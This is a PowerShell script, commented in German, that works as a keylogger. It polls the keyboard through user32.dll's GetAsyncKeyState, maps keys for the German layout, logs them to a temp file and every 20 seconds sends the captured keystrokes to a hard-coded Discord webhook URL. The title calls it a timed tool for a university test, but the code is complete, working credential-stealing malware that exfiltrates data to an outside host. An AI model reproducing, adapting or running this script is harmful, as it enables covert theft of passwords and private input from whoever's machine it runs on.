# PowerShell Keylogger & Discord-Webhook-Sender mit Timeout (z.B. für Uni-Test)
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Keyboard
{
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

$logFile = "$env:TEMP\key.log"
$hookUrl = "https://discord.com/api/webhooks/1433072215401824358/f95HWyiUinYpyysS0MA7NUuSPFs1Ute71SLQ0hEYYvebxsCoQam850qtTGwHRDbR2yg3"

# Zeitmessung beginnen
$start = Get-Date
$timeout = 120 # Sekunden

# Logger-Start an Discord melden
try {
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] gestartet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
} catch {}

function Get-KeyChar {
    param($char)
    $shift = ([Keyboard]::GetAsyncKeyState(16) -ne 0) # Shift-Key
    $caps = ([Keyboard]::GetAsyncKeyState(20) -ne 0) # CapsLock
    $altgr = ([Keyboard]::GetAsyncKeyState(165) -ne 0) # AltGr (rechte Alt-Taste)
    # Mapping für deutsches Layout
    $deMap = @{
        32 = ' '; 13 = "\n"; # Space, Enter
        48 = '0'; 49 = '1'; 50 = '2'; 51 = '3'; 52 = '4'; 53 = '5'; 54 = '6'; 55 = '7'; 56 = '8'; 57 = '9';
        186 = 'ö'; 222 = 'ä'; 192 = 'ü'; 219 = '+'; 221 = '#'; 220 = 'ß';
        188 = ','; 190 = '.'; 191 = '-'; 189 = '-'; 187 = '='; 9 = "\t";
    }
    $deShiftMap = @{
        48 = '='; 49 = '!'; 50 = '"'; 51 = '§'; 52 = '$'; 53 = '%'; 54 = '&'; 55 = '/'; 56 = '('; 57 = ')';
        186 = 'Ö'; 222 = 'Ä'; 192 = 'Ü'; 219 = '*'; 221 = ''''; 220 = '?';
        188 = ';'; 190 = ':'; 191 = '_'; 189 = '_'; 187 = '*';
    }
    $deAltGrMap = @{
        81 = '@'; 69 = '€'; 55 = '{'; 56 = '['; 57 = ']'; 48 = '}'; 222 = '"'; 191 = '\\'; 220 = '~';
    }
    # Buchstaben
    if ($char -ge 65 -and $char -le 90) {
        if ($shift -xor $caps) {
            return [char]$char
        } else {
            return ([char]($char + 32))
        }
    }
    # Zahlen und Sonderzeichen
    if ($char -ge 48 -and $char -le 57) {
        if ($altgr -and $deAltGrMap.ContainsKey($char)) {
            return $deAltGrMap[$char]
        } elseif ($shift -and $deShiftMap.ContainsKey($char)) {
            return $deShiftMap[$char]
        } elseif ($deMap.ContainsKey($char)) {
            return $deMap[$char]
        } else {
            return [char]$char
        }
    }
    # Umlaute und weitere Sonderzeichen
    if ($altgr -and $deAltGrMap.ContainsKey($char)) {
        return $deAltGrMap[$char]
    } elseif ($shift -and $deShiftMap.ContainsKey($char)) {
        return $deShiftMap[$char]
    } elseif ($deMap.ContainsKey($char)) {
        return $deMap[$char]
    } elseif ($char -eq 32) {
        return ' '
    } elseif ($char -eq 13) {
        return "\n"
    } else {
        return [char]$char
    }
}

while ($true) {
    $elapsed = (Get-Date) - $start
    if ($elapsed.TotalSeconds -ge $timeout) {
        break
    }
    foreach ($char in 8,9,13,32..126,186,187,188,189,190,191,192,219,220,221,222) {
        if ([Keyboard]::GetAsyncKeyState($char) -eq -32767) {
            $key = Get-KeyChar $char
            Add-Content -Path $logFile -Value $key
        }
    }
    if ((Get-Date).Second % 20 -eq 0) {
        if (Test-Path $logFile) {
            $keylog = Get-Content $logFile -Raw
            if ($keylog.Trim().Length -gt 0) {
                try {
                    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$keylog}|ConvertTo-Json) -ContentType "application/json"
                } catch {}
                Clear-Content $logFile
            }
        }
        Start-Sleep -Seconds 1
    } else {
        Start-Sleep -Milliseconds 40
    }
}
if (Test-Path $logFile) {
    $keylog = Get-Content $logFile -Raw
    if ($keylog.Trim().Length -gt 0) {
        try {
            Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$keylog}|ConvertTo-Json) -ContentType "application/json"
        } catch {}
        Clear-Content $logFile
    }
}
try {
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] beendet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
} catch {}
